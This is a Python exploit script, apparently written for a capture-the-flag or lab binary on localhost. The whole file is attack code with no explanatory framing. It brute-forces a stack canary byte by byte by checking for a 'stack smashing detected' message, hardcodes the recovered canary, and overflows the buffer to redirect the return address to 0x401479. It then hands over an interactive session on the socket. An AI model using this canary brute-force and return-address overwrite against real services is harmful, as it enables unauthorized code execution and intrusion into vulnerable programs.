#!/usr/bin/env python3

from socket import *
from struct import pack
import telnetlib

HOST = "localhost"
PORT = 4000

def db(v):
  return pack("<B", v)

def dw(v):
  return pack("<H", v)

def dd(v):
  return pack("<I", v)

def dq(v):
  return pack("<Q", v)

def send_payload(payload):
  s = socket(AF_INET, SOCK_STREAM)
  s.connect((HOST, PORT))
  s.sendall(payload)
  return s

def main():
  # <--
  # [LOCAL STACK] [STACK CANARY] [EBP] [RET] [ARGS]
  #   8B + 24B         8B         8B

  payload = b"A" * 24
  cookie = b""

  b = 0
  while b < 256:
    s = send_payload(payload + cookie + db(b))
    if b"stack smashing detected" in s.recv(1024):
      s.close()
      b += 1
      continue
    cookie += db(b)
    print(cookie)
    if len(cookie) == 8:
      break
    b = 0

  cookie = b'\x00\x9b\xcc\x14\xc6\x9aU\xc8'

  payload += cookie
  payload += dq(0)  # ebp
  payload += dq(0x401479)   # ret address

  s = send_payload(payload)

  # start interactive session
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

if __name__ == "__main__":
  main()

